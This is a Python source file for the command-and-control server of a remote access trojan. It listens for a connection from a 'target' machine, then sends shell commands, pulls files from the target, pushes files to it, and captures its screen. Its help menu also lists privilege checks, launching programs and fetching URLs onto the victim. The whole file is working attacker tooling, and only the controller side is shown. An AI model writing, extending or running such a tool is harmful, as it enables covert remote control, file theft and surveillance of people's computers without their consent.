#!/usr/bin/python3

import socket
from PIL import Image
import json, base64 ,zlib , io
from termcolor import colored



IP_ADDRESS ="192.168.100.11"


def ON_START():
    pass

def Help():
    text = '''
    ***********CONTROL ROOM********************


    ***********TARGET CONTROL******************
        - exit              # exit the current connection
        - download  <file>  # download a file from target machine
        - send  <file>      # send a file to target machine
        - screenshot        # screenshot the current target's machine
        - open <app>        # starts an executable while maintaining shell
        - priv              # see the current privilage level
        - get <link>        # download a file from the specified URL to the target machine
'''
    print(text)
def Send_File(sent):
    try:    
        with open(sent[5:],"rb") as file:
            send(base64.b64encode(file.read()))
            print(colored("[+] Sent",'blue'))
    except FileNotFoundError:
        print(colored("[-] No Such File Found",'red'))


def Download_Remote_File(sent):
    with open(sent[9:],"wb") as file:
        file_data = receive()
        file.write(base64.b64decode(file_data[2:]))
        print(colored("[+] File Transfered",'blue'))


def send(data):
    json_data = json.dumps(str(data))
    target.send(bytes(json_data.encode('utf-8')))



def receive_screenshot():
    data = b""  # Initialize data as bytes
    try:
        # Set a timeout for the socket
        target.settimeout(2)  # Timeout set to 2 seconds
        
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    break  # Break the loop when no more data is received (socket closed)
                data += chunk
            except socket.timeout:
                # If no data is received within the timeout period, break the loop
                break
    except Exception as e:
        print("Error receiving data:", e)
    
    # Now that all data is received or connection is closed, return the raw bytes
    return data


def receive_screen(client_socket):
        # Receive the size of compressed data
        size_bytes = client_socket.recv(4)
        size = int.from_bytes(size_bytes, byteorder='big')

        # Receive the compressed data
        compressed_data = b''
        while len(compressed_data) < size:
            packet = client_socket.recv(size - len(compressed_data))
            if not packet:
                break
            compressed_data += packet

        # Decompress the data
        img_data = zlib.decompress(compressed_data)

        # Open the image
        img = Image.open(io.BytesIO(img_data))
        img.show()


def receive():
    data = ""
    while True:
        try :
            data = data + " " + str(target.recv(1024).decode('utf-8'))
            return json.loads(data)
        except:
            continue


def wait_and_listen():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEPORT,1)

    s.bind((IP_ADDRESS,4040))
    s.listen(5)

    print(colored("[+] Listening For Connections ...",'green'))

    target , ip = s.accept()
    print(colored("[+] Connection Established From : %s" %str(ip),'blue'))


def shell():
    while True:

        command = input(colored("> ",'yellow'))
        send(command)
        if(command=='exit'):
            print(colored("[-] Aborting Connection... bye",'red'))
            break;
        if(command=='die'):
            print(colored("[-] Closing Connection... bye",'red'))
            break;
        if command.startswith('download'):
            Download_Remote_File(command)
            continue
        if command.startswith('send'):
            Send_File(command)
            continue
        if command == '-h':
            Help()
        elif command =='screenshot':
            # with open("screenshot%d.png" %counter , "wb") as SC:
            #     image = receive_screenshot()
            #     if image=='[-]':
            #         print(colored("[-] Failed Take , Recieve or Delete Screenshot","red"))
            #         continue
            #     else:
            #         SC.write(base64.b64decode(image[3:-2]))
            #         counter +=1
            #         continue
            receive_screen(target)
            continue
        message = receive()
        message =  message.split('\\n')
        Cleaned_Message =""
        for ls in message:
            Cleaned_Message += ls+"\n"

        if '[-]' in Cleaned_Message:
            color = 'red'
        else:
            color = 'green'
        print(colored(str(ip)+"> \n",'yellow'),colored(Cleaned_Message[2:],color))

wait_and_listen()
shell()
s.close()